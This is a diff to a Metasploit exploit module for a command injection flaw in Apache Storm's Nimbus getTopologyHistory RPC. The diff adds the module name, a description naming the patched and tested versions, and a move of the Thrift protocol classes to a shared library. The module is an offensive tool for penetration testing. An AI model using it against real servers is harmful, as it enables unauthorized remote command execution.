+++ modules/exploits/linux/misc/nimbus_gettopologyhistory_cmd_exec.rb
@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'rex/proto/thrift'
+
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
 
@@ -10,16 +12,22 @@ class MetasploitModule < Msf::Exploit::Remote
   include Msf::Exploit::Remote::Tcp
   include Msf::Exploit::CmdStager
 
+  Thrift = Rex::Proto::Thrift
+
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => '',
+        'Name' => 'Apache Storm Nimbus getTopologyHistory Command Execution',
         'Description' => %q{
-          This module exploits a command injection vulnerability within the Nimbus service's getTopologyHistory RPC
-          method. The method takes a single argument which is the name of a user which is concatenated into a string
-          that is executed by bash. In order for the vulnerability to be exploitable, there must have been at least one
-          topology submitted to the server. The topology may be active or inactive, but at least one must be present.
+          This module exploits a command injection vulnerability within the Nimbus service component of Apache Storm.
+          The getTopologyHistory RPC method method takes a single argument which is the name of a user which is
+          concatenated into a string that is executed by bash. In order for the vulnerability to be exploitable, there
+          must have been at least one topology submitted to the server. The topology may be active or inactive, but at
+          least one must be present.
+
+          This vulnerability was patched in versions 2.1.1, 2.2.1 and 1.2.4. This exploit was tested on version 2.2.0
+          which is affected.
         },
         'Author' => [
           'Alvaro Muñoz', # discovery and original research
@@ -145,58 +153,5 @@ class MetasploitModule < Msf::Exploit::Remote
     return res_size + res
   rescue Timeout::Error
     return nil
-  end
-
-  module Thrift
-    class DataType < BinData::Uint8
-      T_STOP = 0
-      T_UTF7 = 11
-
-      default_parameter assert: -> { !DataType.name(value).nil? }
-
-      def self.name(value)
-        constants.select { |c| c.upcase == c }.find { |c| const_get(c) == value }
-      end
-
-      def to_sym
-        self.class.name(value)
-      end
-    end
-
-    class MessageType < BinData::Uint16be
-      CALL = 1
-      REPLY = 2
-
-      default_parameter assert: -> { !MessageType.name(value).nil? }
-
-      def self.name(value)
-        constants.select { |c| c.upcase == c }.find { |c| const_get(c) == value }
-      end
-
-      def to_sym
-        self.class.name(value)
-      end
-    end
-
-    class Header < BinData::Record
-      endian :big
-
-      uint16       :version, initial_value: 0x8001
-      message_type :message_type
-      uint32       :method_name_length, value: -> { method_name.length }
-      string       :method_name, read_length: :method_name_length
-      uint32       :sequence_id
-    end
-
-    class Data < BinData::Record
-      endian :big
-
-      data_type :data_type, initial_value: DataType::T_STOP
-      uint16    :field_id, onlyif: -> { data_type != DataType::T_STOP }
-      uint32    :data_length, onlyif: -> { data_type != DataType::T_STOP }, value: -> { data_value.length }
-      choice    :data_value, onlyif: -> { data_type != DataType::T_STOP }, selection: :data_type do
-        string DataType::T_UTF7
-      end
-    end
   end
 end
